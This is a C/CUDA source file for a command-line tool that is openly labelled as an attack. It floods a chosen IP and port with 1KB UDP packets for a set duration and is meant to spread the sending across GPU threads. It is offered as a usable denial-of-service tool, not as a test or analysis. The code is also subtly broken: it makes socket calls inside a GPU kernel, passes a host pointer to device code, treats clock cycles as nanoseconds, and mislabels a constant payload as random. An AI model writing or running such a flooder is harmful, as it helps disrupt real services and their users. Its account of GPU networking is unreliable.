#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <cuda_runtime.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

#define PACKET_SIZE 1024  // 1KB UDP packet
#define THREADS_PER_BLOCK 256  // Adjust based on GPU capability

// CUDA Kernel for sending UDP packets
__global__ void udp_flood(char* target_ip, int target_port, int duration) {
    int sock;
    struct sockaddr_in server;
    char packet[PACKET_SIZE];

    memset(packet, 'A', PACKET_SIZE);  // Random data payload

    // Setup target address
    server.sin_family = AF_INET;
    server.sin_port = htons(target_port);
    server.sin_addr.s_addr = inet_addr(target_ip);

    // Open UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;

    long long start_time = clock64();
    long long end_time = start_time + duration * 1000000000LL;  // Convert seconds to nanoseconds

    while (clock64() < end_time) {
        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr*)&server, sizeof(server));
    }

    close(sock);
}

// Host function to launch GPU threads
void start_attack(char* target_ip, int target_port, int duration, int num_blocks) {
    udp_flood<<<num_blocks, THREADS_PER_BLOCK>>>(target_ip, target_port, duration);
    cudaDeviceSynchronize();
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <Port> <Duration (seconds)> <Blocks>\n", argv[0]);
        return 1;
    }

    char* target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_blocks = atoi(argv[4]);

    printf("Starting CUDA UDP flood on %s:%d for %d seconds using %d blocks.\n", target_ip, target_port, duration, num_blocks);

    start_attack(target_ip, target_port, duration, num_blocks);
    printf("Attack completed.\n");

    return 0;
}
